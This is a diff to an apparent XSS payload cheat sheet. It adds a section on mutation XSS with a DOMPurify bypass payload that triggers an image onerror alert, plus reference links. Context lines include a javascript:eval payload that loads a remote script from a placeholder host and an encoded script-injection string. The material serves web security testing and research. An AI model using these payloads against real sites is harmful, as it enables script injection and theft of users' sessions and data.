@@ -18,6 +18,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [XSS Hunter](#xss-hunter)
   - [Other Blind XSS tools](#other-blind-xss-tools)
   - [Blind XSS endpoint](#blind-xss-endpoint)
+- [Mutated XSS](#mutated-xss)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
   - [Bypass case sensitive](#bypass-case-sensitive)
@@ -422,6 +423,15 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Comment Box
   - Administrative Panel
 
+## Mutated XSS
+
+Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
+
+Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.
+
+```javascript
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
 
 ## Polyglot XSS
 
@@ -1055,3 +1065,5 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
 - [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
+- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
